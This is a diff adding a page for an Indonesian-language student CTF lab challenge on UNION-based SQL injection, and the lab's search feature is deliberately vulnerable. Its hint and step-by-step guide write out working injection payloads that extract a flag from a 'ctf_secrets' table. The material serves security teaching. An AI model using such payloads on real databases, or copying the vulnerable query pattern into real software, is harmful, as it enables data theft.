@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SQLi #2 — UNION Attack</title>
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+  <nav class="navbar">
+    <div class="nav-brand"><span>🛡️</span> CTF Lab</div>
+    <div class="nav-links"><a href="/dashboard.html" class="nav-link">← Dashboard</a></div>
+    <div class="nav-user"><span class="user-badge" id="user-nim">...</span></div>
+  </nav>
+  <div class="main-content">
+    <div class="challenge-page">
+      <div class="challenge-header">
+        <div style="display:flex;gap:10px;align-items:center;margin-bottom:12px">
+          <span class="badge-diff diff-medium">Medium</span>
+          <span class="challenge-category cat-sqli">SQLi · Challenge #2</span>
+          <span class="badge-points">⚡ 200 pts</span>
+        </div>
+        <h1>SQL Injection — UNION Attack</h1>
+        <p class="challenge-desc-full">Fitur pencarian produk rentan terhadap UNION-based SQL Injection. Ekstrak flag yang tersembunyi di tabel <code>ctf_secrets</code> menggunakan UNION SELECT!</p>
+        <details class="hint-box">
+          <summary>💡 Tampilkan Hint</summary>
+          <p>Query asal: <code>SELECT id, name, price, category FROM ctf_products WHERE name LIKE '%INPUT%'</code><br><br>
+          Payload UNION (4 kolom):<br>
+          <code>' UNION SELECT 1,secret_value,3,4 FROM ctf_secrets WHERE secret_name='flag_sqli2'--</code></p>
+        </details>
+      </div>
+
+      <div class="tutorial-card mb-4" style="background:var(--bg2)">
+        <h3>🔍 Fitur Pencarian Produk (Rentan)</h3>
+        <div style="display:flex;gap:10px;margin-bottom:16px">
+          <input type="text" id="search-input" class="flag-input" placeholder="Cari produk... atau masukkan payload SQLi" style="flex:1">
+          <button class="btn-submit-flag" onclick="doSearch()">Cari</button>
+        </div>
+        <div id="query-display" class="code-block" style="margin-bottom:12px;font-size:0.8rem">
+          <span class="comment">// Query akan ditampilkan di sini...</span>
+        </div>
+        <div id="search-results"></div>
+      </div>
+
+      <div class="tutorial-card mb-4" style="background:var(--bg2)">
+        <h3>📋 Panduan UNION SQLi</h3>
+        <div class="code-block">
+          <span class="comment">// Step 1: Cari jumlah kolom (coba dulu dengan normal)</span><br>
+          <span class="string">' UNION SELECT 1,2,3,4--</span><br><br>
+          <span class="comment">// Step 2: Ekstrak flag dari tabel ctf_secrets</span><br>
+          <span class="string">' UNION SELECT 1,secret_value,3,4 FROM ctf_secrets WHERE secret_name='flag_sqli2'--</span><br><br>
+          <span class="comment">// Perhatikan: kolom ke-2 (name) yang akan tampil di hasil pencarian</span>
+        </div>
+      </div>
+
+      <div class="flag-submit-card">
+        <h3>🚩 Submit Flag</h3>
+        <div class="flag-input-wrap">
+          <input type="text" class="flag-input" id="flag-input" placeholder="CTF{...}">
+          <button class="btn-submit-flag" onclick="submitFlag()">Submit</button>
+        </div>
+        <div class="alert" id="flag-alert" style="margin-top:10px"></div>
+      </div>
+    </div>
+  </div>
+  <script>
+    async function init() {
+      const me = await fetch('/api/auth/me').then(r=>r.json()).catch(()=>null);
+      if (!me || me.role !== 'student') return location.href = '/';
+      document.getElementById('user-nim').textContent = me.user.nim;
+      doSearch(); // Load default products
+    }
+    async function doSearch() {
+      const q = document.getElementById('search-input').value;
+      const r = await fetch('/vuln/sqli-2/search?q=' + encodeURIComponent(q));
+      const d = await r.json();
+      document.getElementById('query-display').innerHTML = `<span class="comment">// Query yang dieksekusi:</span>\n<span class="highlight">${escH(d.query_used)}</span>`;
+      if (d.success && d.results.length > 0) {
+        document.getElementById('search-results').innerHTML = `
+          <table style="width:100%;border-collapse:collapse;font-size:0.875rem">
+            <thead><tr style="color:var(--text-dim)"><th style="padding:8px;text-align:left">ID</th><th style="padding:8px;text-align:left">Nama</th><th style="padding:8px;text-align:left">Harga</th><th style="padding:8px;text-align:left">Kategori</th></tr></thead>
+            <tbody>${d.results.map(r=>`<tr><td style="padding:8px">${escH(String(r.id))}</td><td style="padding:8px;color:var(--green);font-weight:600">${escH(String(r.name))}</td><td style="padding:8px">${escH(String(r.price))}</td><td style="padding:8px">${escH(String(r.category))}</td></tr>`).join('')}</tbody>
+          </table>`;
+      } else if (d.error) {
+        document.getElementById('search-results').innerHTML = `<div class="warn-box">⚠️ SQL Error: ${escH(d.error)}</div>`;
+      } else {
+        document.getElementById('search-results').innerHTML = '<p class="text-dim">Tidak ada hasil.</p>';
+      }
+    }
+    function escH(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+    async function submitFlag() {
+      const flag = document.getElementById('flag-input').value.trim();
+      const alertEl = document.getElementById('flag-alert');
+      if (!flag) return;
+      const r = await fetch('/api/challenges/submit', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({slug:'sqli-2',flag})});
+      const d = await r.json();
+      alertEl.className = 'alert show ' + (d.success ? 'alert-success' : 'alert-error');
+      alertEl.textContent = d.success ? `🎉 ${d.message}` : `❌ ${d.error}`;
+      if (d.success) setTimeout(()=>location.href='/dashboard.html', 2000);
+    }
+    init();
+  </script>
+</body>
+</html>
